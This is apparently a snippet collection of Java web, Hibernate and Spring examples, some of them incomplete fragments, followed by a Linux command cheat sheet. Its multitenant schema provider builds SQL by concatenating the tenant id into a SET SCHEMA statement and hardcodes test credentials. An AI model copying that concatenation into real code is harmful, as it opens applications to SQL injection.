import javax.xml.ws.WebFault;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.9-b130926.1035
 * Generated source version: 2.2
 * 
 */
@WebFault(name = "EmployeeNotFound", targetNamespace = "http://bottomup.server.jaxws.baeldung.com/")
public class EmployeeNotFound_Exception
    extends Exception
{

    /**
     * Java type that goes as soapenv:Fault detail element.
     * 
     */
    private EmployeeNotFound faultInfo;

    /**
     * 
     * @param faultInfo
     * @param message
     */
    public EmployeeNotFound_Exception(String message, EmployeeNotFound faultInfo) {
        super(message);
        this.faultInfo = faultInfo;
    }

    /**
     * 
     * @param faultInfo
     * @param cause
     * @param message
     */
    public EmployeeNotFound_Exception(String message, EmployeeNotFound faultInfo, Throwable cause) {
        super(message, cause);
        this.faultInfo = faultInfo;
    }

    /**
     * 
     * @return
     *     returns fault bean: com.baeldung.jaxws.client.EmployeeNotFound
     */
    public EmployeeNotFound getFaultInfo() {
        return faultInfo;
    }

}
--------------------------------------------------------------------------------------------------------
import com.baeldung.jaxws.server.repository.EmployeeRepository;

import javax.inject.Inject;
import javax.jws.WebMethod;
import javax.jws.WebService;


@WebService(name = "EmployeeServiceTopDown", targetNamespace = "http://topdown.server.jaxws.baeldung.com/", endpointInterface = "com.baeldung.jaxws.server.topdown.EmployeeServiceTopDown")
public class EmployeeServiceTopDownImpl implements EmployeeServiceTopDown {

    @Inject private EmployeeRepository employeeRepositoryImpl;

    @WebMethod
    public int countEmployees() {
        return employeeRepositoryImpl.count();
    }
}

import javax.jws.WebMethod;
import javax.jws.WebResult;
import javax.jws.WebService;
import javax.jws.soap.SOAPBinding;
import javax.xml.bind.annotation.XmlSeeAlso;


/**
 * This class was generated by the JAX-WS RI.
 * JAX-WS RI 2.2.4-b01
 * Generated source version: 2.2
 * 
 */
@WebService(name = "EmployeeServiceTopDown", targetNamespace = "http://topdown.server.jaxws.baeldung.com/")
@SOAPBinding(parameterStyle = SOAPBinding.ParameterStyle.BARE)
@XmlSeeAlso({
    ObjectFactory.class
})
public interface EmployeeServiceTopDown {


    /**
     * 
     * @return
     *     returns int
     */
    @WebMethod(action = "http://topdown.server.jaxws.baeldung.com/EmployeeServiceTopDown/countEmployees")
    @WebResult(name = "countEmployeesResponse", targetNamespace = "http://topdown.server.jaxws.baeldung.com/", partName = "parameters")
    public int countEmployees();

}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.annotation.WebInitParam;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet(
  name = "BankAccountServlet", 
  description = "Represents a Bank Account and it's transactions", 
  urlPatterns = {"/account", "/bankAccount" }, 
  initParams = { @WebInitParam(name = "type", value = "savings") }
  )
/*@ServletSecurity(
  value = @HttpConstraint(rolesAllowed = {"Member"}),
  httpMethodConstraints = {@HttpMethodConstraint(value = "POST", rolesAllowed = {"Admin"})}
  )*/
public class AccountServlet extends javax.servlet.http.HttpServlet {

    String accountType = null;

    public void init(ServletConfig config) throws ServletException {
        accountType = config.getInitParameter("type");
    }

    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {

        PrintWriter writer = response.getWriter();
        writer.println("<html>Hello, I am an AccountServlet!</html>");
        writer.flush();
    }

    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
        
        double accountBalance = 1000d;
        String paramDepositAmt = request.getParameter("dep");
        double depositAmt = Double.parseDouble(paramDepositAmt);

        accountBalance = accountBalance + depositAmt;
        
        PrintWriter writer = response.getWriter();
        writer.println("<html> Balance of " + accountType + " account is: " + accountBalance + "</html>");
        writer.flush();
    }
}
--------------------------------------------------------------------------------------------------------
import java.io.IOException;
import java.io.PrintWriter;

import javax.servlet.ServletException;
import javax.servlet.annotation.MultipartConfig;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.Part;

@WebServlet(urlPatterns = { "/uploadCustDocs" })
@MultipartConfig(
  fileSizeThreshold = 1024 * 1024 * 20,
  maxFileSize = 1024 * 1024 * 20,
  maxRequestSize = 1024 * 1024 * 25,
  location = "D:/custDocs"
  )
public class UploadCustomerDocumentsServlet extends HttpServlet {

    protected void doPost(
     HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
        for (Part part : request.getParts()) {
            part.write("myFile");
        }
      
        PrintWriter writer = response.getWriter();
        writer.println("<html>File uploaded successfully!</html>");
        writer.flush();
    }

}
--------------------------------------------------------------------------------------------------------
import javax.servlet.ServletContextEvent;
import javax.servlet.ServletContextListener;
import javax.servlet.annotation.WebListener;

@WebListener
public class BankAppServletContextListener implements ServletContextListener {

    public void contextInitialized(ServletContextEvent sce) { 
        sce.getServletContext().setAttribute("ATTR_DEFAULT_LANGUAGE", "english"); 
    } 
    
    public void contextDestroyed(ServletContextEvent sce) { 
        System.out.println("CONTEXT DESTROYED"); 
    } 
}
--------------------------------------------------------------------------------------------------------
DefaultKafkaProducerFactory<Integer, String> pf = new DefaultKafkaProducerFactory<>(senderProps);
		KafkaTemplate<Integer, String> template = new KafkaTemplate<>(pf);
		template.setDefaultTopic(topic4);
		template.sendDefault(0, 0, "foo");
		template.flush();
		pf.destroy();
		
		Instant.now().plusMillis(this.replyTimeout)
--------------------------------------------------------------------------------------------------------
import org.immutables.value.Value;

@Value.Immutable
public abstract class Person {
    abstract String getName();
    abstract Integer getAge();
}
import org.immutables.value.Value;

@Value.Immutable(prehash = true)
public abstract class Person {
    abstract String getName();
    abstract Integer getAge();
}
import org.immutables.value.Value;

@Value.Immutable
public abstract class Person {

    @Value.Parameter
    abstract String getName();

    @Value.Parameter
    abstract Integer getAge();
}
import org.immutables.value.Value;

@Value.Immutable(prehash = true)
public abstract class Person {

    abstract String getName();

    @Value.Default
    Integer getAge() {
        return 42;
    }
}
import org.immutables.value.Value;

@Value.Immutable
public abstract class Person {
    abstract String getName();
    abstract Integer getAge();

    @Value.Auxiliary
    abstract String getAuxiliaryField();
}

--------------------------------------------------------------------------------------------------------
application/vnd.spring-boot.actuator.v2+json;charset=UTF-8
--------------------------------------------------------------------------------------------------------
@AnyMetaDef(name = "EntityDescriptionMetaDef", metaType = "string", idType = "int",
        metaValues = {
                @MetaValue(value = "Employee", targetEntity = Employee.class),
                @MetaValue(value = "Phone", targetEntity = Phone.class)
        })
package com.baeldung.hibernate.pojo;

import org.hibernate.annotations.AnyMetaDef;
import org.hibernate.annotations.MetaValue;

    @Id
    @GeneratedValue(generator = "prod-generator")
    @GenericGenerator(name = "prod-generator", parameters = @Parameter(name = "prefix", value = "prod"), strategy = "com.baeldung.hibernate.pojo.generator.MyGenerator")
    private String prodId;
--------------------------------------------------------------------------------------------------------
import org.hibernate.annotations.*;

import javax.persistence.Entity;
import javax.persistence.*;
import java.io.Serializable;
import java.util.HashSet;
import java.util.Set;

@Entity
@Where(clause = "deleted = false")
@FilterDef(name = "incomeLevelFilter", parameters = @ParamDef(name = "incomeLimit", type = "int"))
@Filter(name = "incomeLevelFilter", condition = "grossIncome > :incomeLimit")
public class Employee implements Serializable {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Integer id;

    private long grossIncome;

    private int taxInPercents;

    private boolean deleted;

    public long getTaxJavaWay() {
        return grossIncome * taxInPercents / 100;
    }

    @Formula("grossIncome * taxInPercents / 100")
    private long tax;

    @OneToMany
    @JoinColumn(name = "employee_id")
    @Where(clause = "deleted = false")
    private Set<Phone> phones = new HashSet<>(0);

    public Employee() {
    }

    public Employee(long grossIncome, int taxInPercents) {
        this.grossIncome = grossIncome;
        this.taxInPercents = taxInPercents;
    }

    public Integer getId() {
        return id;
    }

    public long getGrossIncome() {
        return grossIncome;
    }

    public int getTaxInPercents() {
        return taxInPercents;
    }

    public long getTax() {
        return tax;
    }

    public void setId(Integer id) {
        this.id = id;
    }

    public void setGrossIncome(long grossIncome) {
        this.grossIncome = grossIncome;
    }

    public void setTaxInPercents(int taxInPercents) {
        this.taxInPercents = taxInPercents;
    }

    public boolean getDeleted() {
        return deleted;
    }

    public void setDeleted(boolean deleted) {
        this.deleted = deleted;
    }

    public Set<Phone> getPhones() {
        return phones;
    }
}
--------------------------------------------------------------------------------------------------------
import static org.hamcrest.Matchers.equalTo;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.content;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

import org.junit.Test;
import org.junit.runner.RunWith;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.junit4.SpringRunner;
import org.springframework.test.web.servlet.MockMvc;
import org.springframework.test.web.servlet.request.MockMvcRequestBuilders;

@RunWith(SpringRunner.class)
@SpringBootTest
@AutoConfigureMockMvc
public class HelloControllerTest {

    @Autowired
    private MockMvc mvc;

    @Test
    public void getHello() throws Exception {
        mvc.perform(MockMvcRequestBuilders.get("/").accept(MediaType.APPLICATION_JSON))
                .andExpect(status().isOk())
                .andExpect(content().string(equalTo("Greetings from Spring Boot!")));
    }
}

public Address validateAddress(AddressDTO addressDTO) {

        Address addressToSearch = new Address(addressDTO.getCountry(), addressDTO.getCity(), addressDTO.getPostcode(),
            addressDTO.getStreet(), addressDTO.getStreetNumber());

        //@formatter:off
        ExampleMatcher matcher =
            ExampleMatcher.matching()
                    .withMatcher("country", startsWith().ignoreCase())
                    .withMatcher("postcode", startsWith().ignoreCase())
                    .withMatcher("street", contains().ignoreCase())
                    .withMatcher("streetNumber", contains().ignoreCase())
                    .withMatcher("city", contains().ignoreCase());

        //@formatter:on
        Example<Address> searchExample = Example.of(addressToSearch, matcher);

        return addressRepository.findOne(searchExample);

    }
	
	@Test
public void testSingle() {
	// tag::example-mono[]
	Employee e = new Employee();
	e.setFirstName("Bilbo");
	Example<Employee> example = Example.of(e);
	// end::example-mono[]

	// tag::query-mono[]
	Mono<Employee> singleEmployee = repository.findOne(example);
	// end::query-mono[]

	StepVerifier.create(singleEmployee)
		.expectNextMatches(employee -> {
			assertThat(employee).hasNoNullFieldsOrProperties();
			assertThat(employee.getFirstName()).isEqualTo("Bilbo");
			assertThat(employee.getLastName()).isEqualTo("Baggins");
			assertThat(employee.getRole()).isEqualTo("burglar");
			return true;
		})
		.expectComplete()
		.verify();
}
--------------------------------------------------------------------------------------------------------
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
	
/**
 * Schema selecting multitenant provider.
 *
 * Works with PgSQL database and HikariCP pool.
 */
public class MultitenantSchemaProvider implements MultiTenantConnectionProvider {
  /**
   * Connection pool.
   */
  private HikariDataSource connectionProvider;
 
  /**
   * Switches search path on specified connection.
   * @param c connection to operate on
   * @param schema tenant id
   * @throws SQLException is thrown when not able
   * to return connection to the pool.
   */
  private void setSchemaTo(Connection c, String schema) throws SQLException {
    try {
      c.createStatement().execute("SET SCHEMA '" + schema.toLowerCase() + "'");
    } catch (SQLException e) {
      connectionProvider.evictConnection(c);
      throw new HibernateException("Error while switching schema", e);
    }
  }
 
  /**
   * Here we instantiate database connection pool.
   */
  public MultitenantSchemaProvider() {
    HikariConfig parameters = new HikariConfig();
 
    parameters.setDataSourceClassName("org.postgresql.ds.PGSimpleDataSource");
    parameters.setUsername("test");
    parameters.setPassword("test");
    parameters.setMaximumPoolSize(2);
    parameters.addDataSourceProperty("databaseName", "test");
    parameters.addDataSourceProperty("serverName", "192.168.75.5");
 
    connectionProvider = new HikariDataSource(parameters);
  }
 
  @Override
  public Connection getAnyConnection() throws SQLException {
    return connectionProvider.getConnection();
  }
 
  @Override
  public void releaseAnyConnection(Connection connection) throws SQLException {
    connectionProvider.evictConnection(connection);
  }
 
  @Override
  public Connection getConnection(String s) throws SQLException {
    Connection c = getAnyConnection();
    setSchemaTo(c, s);
    return c;
  }
 
  @Override
  public void releaseConnection(String s, Connection connection) throws SQLException {
    setSchemaTo(connection, "public");
    releaseAnyConnection(connection);
  }
 
  @Override
  public boolean supportsAggressiveRelease() {
    return false;
  }
 
  /* Spi related mandatory methods */
  @Override
  public boolean isUnwrappableAs(Class aClass) {
    return false;
  }
 
  @Override
  public <T> T unwrap(Class<T> aClass) {
    return null;
  }
}

https://easyjava.ru/data/hibernate/hibernate-schema-multitenancy/
https://habr.com/ru/post/252353/

<hibernate-configuration>
  <session-factory>
    <property name="hibernate.multiTenancy">SCHEMA</property>
    <property name="hibernate.multi_tenant_connection_provider">ru.easyjava.data.hibernate.multitenancy.MultitenantSchemaProvider</property>
 
    <property name="hibernate.hbm2ddl.auto">update</property>
    <property name="hibernate.dialect">org.hibernate.dialect.PostgreSQL94Dialect</property>
 
    <!-- mappings skipped -->
  </session-factory>
 
</hibernate-configuration>
--------------------------------------------------------------------------------------------------------
@Scope(proxyMode = ScopedProxyMode.INTERFACES)
--------------------------------------------------------------------------------------------------------
import com.questionmarks.model.dto.ExamCreationDTO;
import com.questionmarks.model.dto.ExamUpdateDTO;
import org.junit.Test;
import org.modelmapper.ModelMapper;

import static org.junit.Assert.assertEquals;

public class ExamUT {
    private static final ModelMapper modelMapper = new ModelMapper();

    @Test
    public void checkExamMapping() {
        ExamCreationDTO creation = new ExamCreationDTO();
        creation.setTitle("Testing title");
        creation.setDescription("Testing description");

        Exam exam = modelMapper.map(creation, Exam.class);
        assertEquals(creation.getTitle(), exam.getTitle());
        assertEquals(creation.getDescription(), exam.getDescription());
        assertEquals(creation.getCreatedAt(), exam.getCreatedAt());
        assertEquals(creation.getEditedAt(), exam.getEditedAt());

        ExamUpdateDTO update = new ExamUpdateDTO();
        update.setTitle("New title");
        update.setDescription("New description");

        modelMapper.map(update, exam);
        assertEquals(update.getTitle(), exam.getTitle());
        assertEquals(update.getDescription(), exam.getDescription());
        assertEquals(creation.getCreatedAt(), exam.getCreatedAt());
        assertEquals(update.getEditedAt(), exam.getEditedAt());
    }
}
--------------------------------------------------------------------------------------------------------
<Connector connectionTimeout="20000" asyncTimeout="30000" maxThreads="1000"
    port="8080" protocol="org.apache.coyote.http11.Http11NioProtocol"
    redirectPort="8443" />
--------------------------------------------------------------------------------------------------------
uname 	Displays  Linux system information
uname -r 	Displays  kernel release information
uptime 	Displays how long the system has been running including load average
hostname 	Shows the system hostname
hostname -i 	Displays the IP address of the system
last reboot 	Shows system reboot history
date 	Displays current system date and time
timedatectl 	Query and change the System clock
cal 	Displays the current calendar month and day
w 	Displays currently  logged in users in the system
whoami 	Displays who you are logged in as
finger username 	Displays information about the user
General
su 	Switches user.
	
- <user> 	Switches to user.
- 	Switches to root.
	
man 	Help on commands.
	
<section> 	Section numbers: 1. Programs, 2. System calls, 3. Library calls, 4. Special files, 5. File formats, 7. Miscellaneous, 8. System administration commands
	
echo 	Prints passed text.
	
-n 	Does not add newline at the end.
-e 	Enables interpretation of backslashed letters.
	
xargs <cmd> 	Passes output from one command to arguments of another:
'echo -a | xargs ls'
	
-t 	Echoes the command before executing it.
-p 	Echoes command and asks for confirmation before execution.
-0 	Input items are separated by null character instead of space.
	
tee <file> 	Sends output of a program to specified file and to standard output:
'<cmd_1> | tee out_1.txt | <cmd_2>'
	
/dev/tty 	Sends output to terminal and to standard output
	
expr 	Evaluates passed expression.
	
1 + 1 	Prints '2'.
	
bc 	Evaluates input. It's basically a calculator, but also provides some control commands.
	
echo 1 + 1 | bc 	Prints '2'.
echo "scale=5;3/4" | bc 	Prints '.75000'.
	
sh 	Runs command interpreter (shell). Can run a script even if not executable.
	
-c '<commands>' 	Starts new non-interactive shell and reads commands from arguments instead of 'stdin'.
To append lines to system configuration file run:
'sudo sh -c 'echo "<text>" >> <file>''
	
bash 	Runs bash command interpreter (shell).
	
-c 	Reads commands from arguments instead of 'stdin'.
-n <script> 	Checks script for errors.
-x 	Prints commands before execution. Useful for debugging.
	
gcc 	Gnu C compiler. Run 'g++' for C++ code.
	
-w 	Supresses warnings (Only prints errors).
-Wall 	All warnings.
-g 	Compile for debugging.
-std=<std> 	Sets the standard. Suported standards for C are:
'c90', 'gnu90', 'c99', 'gnu99', 'c11' and 'gnu11'.
Suported standarts for C++ are:
'c++98', 'gnu++98', 'c++11' and 'gnu++11'.
'gnu90' and 'gnu++98' are the default options.
-O<level> 	Optimization level. '0': Reduce compilation time (default), '1-3': - Level of optimization, 's' - Optimize for size, 'g' - Optimize debugging experience.
	
run-parts <dir> 	Runs all scripts or programs in a directory.
	
date 	Tells and sets date and time.
	
-s <string> 	Sets date.
+%T -s "10:13:13" 	Sets time.
	
timedatectl 	Controls the system time and date.
	
set-timezone CET 	Sets timezone.
	
cal 	Calendar
	
xclip 	Copies to clipboard.
	
mkfifo <pipe> 	Creates named pipe during that shell session.
	
mkisofs 	Creates a DVD/CD image.
	
genisoimage 	Creates a DVD/CD image (Debian).
	
cdrecord 	Writes to a CD/DVD.
	
acpi 	Checks battery.
	
fdisk -l (sudo) 	Shows partitions.
	
shutdown 	Closes down the system at a given time.
	
now 	Takes you to the single user mode.
-h now 	Begins the shutdown procedure, same as 'halt' and 'poweroff'.
-h 11:50 	At 11:50.
-r now 	Same as 'reboot'.
	
make 	Utility that maintains groups of programs.
	
-q 	Doesn't run any commands, just returns '0' exit code if everything is up to date or non-zero otherwise.
-B 	Unconditionally makes all targets.
Files
ls 	
-d 	List directory names instead of contents
-S 	Sort by size
-t 	Sort by time
-1 	One file per line
./* 	Ls one level deep
-i 	Get inode number of file (file id). Use 'sudo find / -inum <number>' to find all links that point to same file.
	
cp 	
-i 	Interactive (Prompts before overwrite)
-v 	Verbose (Explains what is being done)
-R 	Copy directories recursively
-p 	Preserve mode, ownership and timestamps
--preserve=all 	Also preserves context, links and xattr
	
rm 	
-i 	Interactive (Prompts before every removal)
-v 	Verbose (Explains what is being done)
-f 	Force remove (Does not prompt, useful if 'rm' is aliased with '-i')
-R 	Removes directories and their content recursively
	
mkdir 	
-p 	Make parents if needed
	
ln 	Makes links to the files
	
-s <file> <link> 	Makes symbolic link. If you want to use relative paths you must be in links directory !!!!!!!!!!!!!!!!!!!!!!
	
df 	
-h 	Displays humanly readable free disk space
	
du 	
-s <dir> 	Directory size
	
mc 	Midnight commander
	
Alt o 	Open parent dir in another panel
Ctrl o 	Switch to bash
	
find <dir> 	
-name <file> 	Search by name
-regex <regex> 	Use regex for name search
-not 	Insert before other options to negate
-maxdepth <levels> 	Descend only to levels deep
-samefile <file> 	Find all hard links of a file
-xdev 	Don't descend directories on other filesystems
-inum <inum> 	Find files with the inode number
-type <f|d|b|...> 	Find files of type
-delete 	Delete found files
-exec <cmd> {} \; 	Find files and execute command for every found file. '{}' is replaced with filename
-exec <cmd> {} + 	Find files and execute command with all filenames in place of '{}'
-atime +/-n 	Find files that were last accessed less or more than n days.
-print0 | xargs -0 <cmd> 	Sends found files to a command as parameters. Uses 'NUL' character as separator, necessary for filenames with spaces
	
locate <regex> 	Similar as 'find' but using index
	
-i 	Ignore case
--regex 	Interprets all patterns as extended regex
-0 | xargs -0 <cmd> 	Sends found files to a command as parameters.
	
updatedb (sudo) 	Update locate index
	
md5sum 	Prints md5 sum hash of a file
	
read 	Read single line from standard input
	
-n 1 	Print after reading one character
-s 	Do not echo input coming from terminal
	
shred 	Securely remove files
	
file 	Determine file's type
	
tree 	Ls in a tree-like (hierarchical) format
	
install 	Copy files and set attributes
	
gpg 	Decrypt file with password
	
-c 	Encrypt
	
mktemp 	Create a temporary file or directory in '/tmp' and returns it's name.
	
rename 	
s/<from>/<to> <files> 	Renames multiple files using 'sed' syntax
	
rsync 	A fast, versatile, remote (and local) file-copying tool
	
-Hbaz -e ssh 	'<src_dir> <user>@<host>:<dest_dir>' - Backs up the 'src-dir': '-H' preserves hard links, '-b' renames preexisting destination files (back up), '-a' preserve everything except hard links and '-z' compresses.
cmp 	Compares two files, similar to diff but also for binaries
	
stat 	Displays files status
	
-c%X 	Time of last modification of the file
	
readlink 	
-f 	Follow link recursively and print files path
	
xdg-open 	Open file with default application for the file type
	
dialog 	Display dialog box from shell script
	
watch 	Execute command periodically
Archives
dtrx 	
<archive> 	Universal archive extractor
	
tar 	
xvzf <file>.tar.gz (.tgz) 	Decompress and detar
xvjf <file>.tar.bz2 	Decompress and detar
-cf <archive>.tar <files> 	Compress
	
unzip 	
\*.zip 	Backslash is necessary so that bash doesn't expand the '*'
-d <dir> 	Extract into directory (create if doesn't exist)
	
zip 	
-r <archive> <dir> 	Compress whole directory recursively.
-g <archive> <files> 	Add files to existing archive (grow).
	
unrar 	
e 	Extract files from rar archive
	
zcat 	Cats gziped file
Packages
dpkg 	Low level package manager for Debian.
	
-l 	Lists installed packages.
-i <package> (sudo) 	Installs package from a package file.
	
apt-get 	Advanced Package Tool built on top of 'dpkg'. New command called simply 'apt' is also available. It merges the functionalities of 'apt-get' and 'apt-cache'.
	
update 	Updates local list of existing packages.
-u dist-upgrade 	Upgrades by intelligently handling changing dependencies with new versions of packages. To regularly update put this line in 'crontab':
'apt-get update && apt-get -u dist-upgrade'.
upgrade 	Same as dist-upgrade, but will not remove installed packages or install new ones.
install <package> 	Also updates single package.
remove <package> 	Removes package but leaves its configurations.
remove apt-listchanges 	Useful when Debian can't find a package.
purge <package> 	Removes package and its configurations. Run 'apt-get autoremove' after to remove all dependencies that are not needed anymore.
autoremove 	Removes unneeded packages.
source <package> 	Downloads code.
build-dep <package> 	Installs the build dependencies.
--yes 	Answers with 'yes' to most questions (Except the ones that can have potentially harmful consequences).
--force-yes 	Answers 'yes' to all questions (Not recommended).
	
apt-cache 	Queries the APT's internal database.
	
search <keyword> 	Searches packages like 'apropos', but globally.
show <package> 	Shows package info like version, dependencies, etc.
showpkg <package> 	Similar, but also shows the packages that depend on the searched package (reverse dependencies).
policy <package> 	Shows installed and remote version.
	
apt-file 	APT package searching utility.
	
search <file> 	Search in which package a file is included.
update 	Updates local list of package contents.
	
aptitude 	Enables package browsing (skin for apt-get).
	
search '~i!~M' 	Lists installed packages that were not installed as a dependency, with short description of each.
search <package> 	Package search.
winetricks 	Installs wine applications.
	
update-alternatives 	Maintains symbolic links determining default commands.
	
unattended-upgrade 	Automatic installation of security upgrades.
Hardware
dmesg 	Displays bootup messages
cat /proc/cpuinfo 	Displays more information about CPU e.g model, model name, cores, vendor id
cat /proc/meminfo 	Displays more information about hardware memory e.g. Total and Free memory
lshw 	Displays information about system's hardware configuration
lsblk 	Displays block devices related information
free -m 	Displays free and used memory in the system (-m flag indicates memory in MB)
lspci -tv 	Displays PCI devices in a tree-like diagram
lsusb -tv 	Displays USB devices in a tree-like diagram
dmidecode 	Displays hardware information from the BIOS
hdparm -i /dev/xda 	Displays information about disk data
hdparm -tT /dev/xda <:code> 	Conducts a read speed test on device xda
badblocks -s /dev/xda 	Tests  for unreadable blocks on disk
Users
id 	Displays the details of the active user e.g. uid, gid, and groups
last 	Shows the last logins in the system
who 	Shows who is logged in to the system
groupadd "admin" 	Adds the group 'admin'
adduser "Sam" 	Adds user Sam
userdel "Sam" 	Deletes user Sam
usermod 	Used for changing / modifying user information
File Commands
ls -al 	Lists files - both regular &  hidden files and their permissions as well.
pwd 	Displays the current directory file path
mkdir 'directory_name' 	Creates a new directory
rm file_name 	Removes a file
rm -f filename 	Forcefully removes a file
rm -r directory_name 	Removes a directory recursively
rm -rf directory_name 	Removes a directory forcefully and recursively
cp file1 file2 	Copies the contents of file1 to file2
cp -r dir1 dir2 	Recursively Copies dir1 to dir2. dir2 is created if it does not exist
mv file1 file2 	Renames file1 to file2
ln -s /path/to/file_name   link_name 	Creates a symbolic link to file_name
touch file_name 	Creates a new file
cat > file_name 	Places standard input into a file
more file_name 	Outputs the contents of a file
head file_name 	Displays the first 10 lines of a file
tail file_name 	Displays the last 10 lines of a file
gpg -c file_name 	Encrypts a file
gpg file_name.gpg 	Decrypts a file
wc 	Prints the number of bytes, words and lines in a file
xargs 	Executes commands from standard input
Process Related
ps 	Display currently active processes
ps aux | grep 'telnet' 	Searches for the id of the process 'telnet'
pmap 	Displays memory map of processes
top 	 Displays all running processes
kill pid 	Terminates process with a given pid
killall proc 	Kills / Terminates all processes named proc
pkill process-name 	Sends a signal to a process with its name
bg 	Resumes suspended jobs in the background
fg 	Brings suspended jobs to the foreground
fg n 	job n to the foreground
lsof 	Lists files that are open by processes
renice 19 PID 	makes a process run with very low priority
pgrep firefox 	find Firefox process ID
pstree 	visualizing processes in tree model
File Permission
chmod octal filename 	Change file permissions of the file to octal
	
Example 	
chmod 777 /data/test.c 	Set rwx permissions to owner, group and everyone (everyone else who has access to the server)
chmod 755 /data/test.c 	Set rwx to the owner and r_x to group and everyone
chmod 766 /data/test.c 	Sets rwx for owner, rw for group and everyone
chown owner user-file 	Change ownership of the file
chown owner-user:owner-group file_name 	Change owner and group owner of the file
chown owner-user:owner-group directory 	Change owner and group owner of the directory
Network
ip addr show 	Displays IP addresses and all the network interfaces
ip address add 192.168.0.1/24 dev eth0 	Assigns IP address 192.168.0.1 to interface eth0
ifconfig  	Displays IP addresses of all network interfaces
ping  host 	ping command sends an ICMP echo request to establish a connection to server / PC
whois domain 	Retrieves more information about a domain name
dig domain 	Retrieves DNS information about the domain
dig -x host  	Performs reverse lookup on a domain
host google.com  	Performs an IP lookup for the domain name
hostname -i 	Displays local IP address
wget file_name 	Downloads a file from an online source
netstat -pnltu 	Displays all active listening ports
Compression/Archives
tar -cf home.tar home<:code> 	Creates archive file called 'home.tar' from file 'home'
tar -xf files.tar 	Extract archive file 'files.tar'
tar -zcvf home.tar.gz source-folder 	Creates gzipped tar archive file from the source folder
gzip file 	Compression a file with .gz extension
Install Packages
rpm -i pkg_name.rpm 	Install an rpm package
rpm -e pkg_name 	Removes an rpm package
dnf install pkg_name 	Install package using dnf utility
Install Source (Compilation)
./configure 	Checks your system for the required software needed to build the program. It will build the Makefile containing the instructions required to effectively build the project
make 	It reads the Makefile to compile the program with the required operations. The process may take some time, depending on your system and the size of the program
make install 	The command installs the binaries in the default/modified paths after the compilation
Search
grep 'pattern' files 	Search for a given pattern in files
grep -r pattern dir 	Search recursively for a pattern in a given directory
locate file 	Find all instances of the file
find /home/ -name "index"  	Find file names that begin with 'index' in /home folder
find /home -size +10000k 	Find files greater than 10000k in the home folder
Login
ssh user@host 	Securely connect to host as user
ssh -p port_number user@host  	Securely connect to host using a specified port
ssh host 	Securely connect to the system via SSH default port 22
telnet host 	Connect to host via telnet default port 23
File Transfer
scp file1.txt server2/tmp 	Securely copy file1.txt to server2 in /tmp directory
rsync -a /home/apps  /backup/ 	Synchronize contents in /home/apps directory with /backup  directory
Disk Usage
df  -h 	Displays free space on mounted systems
df  -i  	Displays free inodes on filesystems
fdisk  -l 	Shows disk partitions, sizes, and types
du  -sh 	Displays disk usage in the current directory in a human-readable format
findmnt 	Displays target mount point for all filesystems
mount device-path mount-point 	Mount a device
Directory Traverse
cd .. 	Move up one level in the directory tree structure
cd 	Change directory to $HOME directory
cd /test 	Change directory to /test directory
--------------------------------------------------------------------------------------------------------
    <resources>
        <resource>
            <directory>${project.basedir}/src/main/resources</directory>
            <targetPath>${project.build.outputDirectory}/META-INF/resources/webjars</targetPath>
        </resource>
    </resources>
--------------------------------------------------------------------------------------------------------
	@Bean
	public WebMvcConfigurer corsConfigurer() {
		return new WebMvcConfigurerAdapter() {
			@Override
			public void addCorsMappings(CorsRegistry registry) {
				registry.addMapping("/api/**").allowedOrigins("https://blog.lqdev.cn");
			}
		};
	}
--------------------------------------------------------------------------------------------------------
@Accessors(chain = true)
--------------------------------------------------------------------------------------------------------
import java.io.Serializable;
import java.util.Date;

import com.baomidou.mybatisplus.activerecord.Model;
import com.baomidou.mybatisplus.annotations.TableId;

import lombok.Data;
import lombok.experimental.Accessors;

/**
 * <p>
 * 
 * </p>
 *
 * @author oKong
 * @since 2018-07-20
 */
@Data
@Accessors(chain = true)
public class User extends Model<User> {

    private static final long serialVersionUID = 1L;

    /**
     * 唯一标示
     */
    @TableId
    private Long id;
    /**
     * 编码
     */
    private String code;
    /**
     * 名称
     */
    private String name;
    
    /**
     * 状态1 启用 0 停用
     */
    private StatusEnum status;
    /**
     * 创建时间
     */
    private Date gmtCreate;
    /**
     * 修改时间
     */
    private Date gmtModified;


    public static final String ID = "id";

    public static final String CODE = "code";

    public static final String NAME = "name";

    public static final String GMT_CREATE = "gmt_create";

    public static final String GMT_MODIFIED = "gmt_modified";

    @Override
    protected Serializable pkVal() {
        return this.id;
    }
}
--------------------------------------------------------------------------------------------------------
@RequestMapping(path="/downloadFile",method=RequestMethod.GET)
    @Consumes(MediaType.APPLICATION_JSON_VALUE)
    public  ResponseEntity<InputStreamReader> downloadDocument(
                String acquistionId,
                String fileType,
                Integer expressVfId) throws IOException {
        File file2Upload = new File("C:\\Users\\admin\\Desktop\\bkp\\1.rtf");
        HttpHeaders headers = new HttpHeaders();
        headers.add("Cache-Control", "no-cache, no-store, must-revalidate");
        headers.add("Pragma", "no-cache");
        headers.add("Expires", "0");
        InputStreamReader i = new InputStreamReader(new FileInputStream(file2Upload));
        System.out.println("The length of the file is : "+file2Upload.length());

        return ResponseEntity.ok().headers(headers).contentLength(file2Upload.length())
                .contentType(MediaType.parseMediaType("application/octet-stream"))
                .body(i);
        }
--------------------------------------------------------------------------------------------------------
buildscript {
    repositories {
        maven { url "http://repo.spring.io/libs-release" }
        mavenLocal()
